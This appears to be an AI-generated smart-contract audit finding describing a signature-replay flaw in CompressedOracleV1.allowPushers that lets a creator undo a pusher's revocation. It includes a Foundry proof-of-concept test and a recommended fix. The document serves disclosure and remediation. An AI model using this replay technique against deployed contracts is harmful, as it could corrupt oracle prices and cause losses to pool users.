The vulnerability is real. Let me trace through the exact code path.

### Title
Signature Replay in `allowPushers` Breaks Pusher-Revocation Finality — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 signature but tracks **no nonce and no used-signature set**. A creator who holds a valid, unexpired signature can call `allowPushers` an unlimited number of times with the same `(deadline, pusher, signature)` tuple. Because `revokePusher` only zeroes `namespaceRemapping[pusher]` without invalidating the original signature, the creator can immediately re-establish the delegation after every revocation attempt, for the entire lifetime of the deadline window.

---

### Finding Description

The signed message is:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

The tuple `(chainid, oracle, deadline, pusher, creator)` is **static** — it contains no counter, no block number, and no per-use salt. The contract stores no record of consumed signatures.

`revokePusher` writes `namespaceRemapping[msg.sender] = address(0)`: [2](#0-1) 

But this does not touch the signature. As long as `block.timestamp <= deadline`, the creator can call `allowPushers` again with the identical calldata and the mapping is restored to `creator`. The code comment on lines 186–191 explicitly acknowledges the deadline is the only replay barrier:

> *"an undated signature could re-establish a delegation AFTER the pusher revoked it"* [3](#0-2) 

The comment treats the deadline as a sufficient fix, but it is not: it only prevents replay **after** expiry, not **within** the validity window.

---

### Impact Explanation

After the creator replays `allowPushers`, the `fallback` push path resolves the pusher's namespace as:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

Any push the pusher makes — believing they are writing to their own namespace after revoking — silently lands in the creator's namespace. If the pusher has moved on to serve a different asset pair or a different creator, their new data overwrites the original creator's slot. Pools consuming that creator's `feedId` receive a corrupted price, enabling bad-price execution (stale, inverted, or wrong-asset quote reaching a swap).

---

### Likelihood Explanation

- The creator retains the pusher's original signature (they received it to call `allowPushers` the first time).
- Deadlines are typically set days in the future (the question's example uses `block.timestamp + 1 days`).
- The replay requires a single additional `allowPushers` call — no special privilege, no new signature needed.
- A pusher who revokes and immediately begins pushing for a new creator is the realistic trigger for data corruption.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) usedSignatures` and revert on reuse:

```solidity
mapping(bytes32 => bool) private _usedSignatures;

// inside allowPushers, after recovering the signer:
require(!_usedSignatures[hash], SignatureAlreadyUsed());
_usedSignatures[hash] = true;
```

Alternatively, include a per-pusher nonce in the signed payload and increment it on each successful `allowPushers` call, so any previously signed message is automatically invalidated after first use.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";

contract ReplayTest is Test {
    CompressedOracleV1 oracle;
    address creator;
    uint256 pusherKey = 0xBEEF;
    address pusher;

    function setUp() public {
        creator = makeAddr("creator");
        pusher  = vm.addr(pusherKey);
        oracle  = new CompressedOracleV1(address(this), 60_000);
    }

    function test_revocationReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // Pusher signs consent for creator
        bytes32 hash = keccak256(abi.encode(
            block.chainid, address(oracle), deadline, pusher, creator
        ));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pusherKey, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        bytes[]   memory sigs    = new bytes[](1);
        pushers[0] = pusher;
        sigs[0]    = sig;

        // Step 1: creator delegates
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Step 2: pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Step 3: creator replays the SAME signature — deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // Revocation is silently undone
        assertEq(oracle.namespaceRemapping(pusher), creator);
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-209)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
